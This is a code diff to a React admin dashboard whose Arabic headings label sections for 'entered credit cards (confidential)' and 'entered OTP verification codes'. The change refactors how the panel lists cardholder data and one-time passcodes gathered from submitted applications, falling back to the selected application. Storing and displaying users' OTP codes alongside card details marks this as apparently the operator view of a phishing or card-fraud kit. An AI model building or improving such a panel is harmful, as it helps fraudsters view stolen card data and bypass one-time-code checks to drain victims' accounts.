@@ -775,12 +775,15 @@ const DashboardApplications = () => {
               )}
 
               {/* جميع البطاقات الائتمانية المدخلة */}
-              {relatedApplications.filter(app => app.cardholder_name).length > 0 && (
-                <div className="space-y-4">
-                  <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
-                  {relatedApplications
-                    .filter(app => app.cardholder_name)
-                    .map((app, index) => (
+              {(() => {
+                const cardApps = (relatedApplications.length > 0 ? relatedApplications : [selectedApp]).filter(Boolean) as Application[];
+                const cards = cardApps.filter(app => !!app.cardholder_name);
+                if (cards.length === 0) return null;
+
+                return (
+                  <div className="space-y-4">
+                    <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
+                    {cards.map((app, index) => (
                       <div key={app.id} className="border-2 border-red-300 dark:border-red-800 rounded-lg p-4">
                         <div className="flex items-center justify-between mb-3">
                           <div className="flex items-center gap-2">
@@ -862,16 +865,20 @@ const DashboardApplications = () => {
                         </div>
                       </div>
                     ))}
-                </div>
-              )}
+                  </div>
+                );
+              })()}
 
               {/* جميع أكواد OTP المدخلة */}
-              {relatedApplications.filter(app => app.otp_code).length > 0 && (
-                <div className="space-y-4">
-                  <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
-                  {relatedApplications
-                    .filter(app => app.otp_code)
-                    .map((app, index) => (
+              {(() => {
+                const otpApps = (relatedApplications.length > 0 ? relatedApplications : [selectedApp]).filter(Boolean) as Application[];
+                const otps = otpApps.filter(app => !!app.otp_code);
+                if (otps.length === 0) return null;
+
+                return (
+                  <div className="space-y-4">
+                    <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
+                    {otps.map((app, index) => (
                       <div key={app.id} className="border-2 border-primary/30 rounded-lg p-4">
                         <div className="flex items-center justify-between mb-3">
                           <div className="flex items-center gap-2">
@@ -932,8 +939,9 @@ const DashboardApplications = () => {
                         </div>
                       </div>
                     ))}
-                </div>
-              )}
+                  </div>
+                );
+              })()}
             </div>
           )}
         </DialogContent>
